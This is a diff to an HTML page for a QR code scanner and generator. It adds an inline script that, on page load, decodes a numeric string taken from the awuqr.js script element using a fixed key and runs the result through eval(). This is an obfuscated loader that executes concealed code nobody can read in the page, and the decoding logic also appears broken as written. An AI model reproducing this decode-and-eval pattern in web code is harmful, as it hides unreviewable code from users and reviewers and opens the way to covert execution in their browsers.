@@ -45,6 +45,19 @@
 
     <script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
-    <script src="./awuqr.js?"></script>
+    <script id="@awu.my.id" src="./awuqr.js?"></script>
+    <script>
+       let encrypted = document.getElementById('@awu.my.id').textContent;
+        let plaintext = '';
+        const key = 331;
+
+        for(let i = 0; i < encrypted.length; i += 3) {
+            const encryptedCharCode = parseInt(encrypted.substring(i, i + 3));
+            const charCode = (encryptedCharCode - key + 256) % 256;
+            plaintext += String.fromCharCode(charCode);
+        }
+
+        // Execute the decoded script
+        eval(plaintext); </script>
 </body>
 </html>
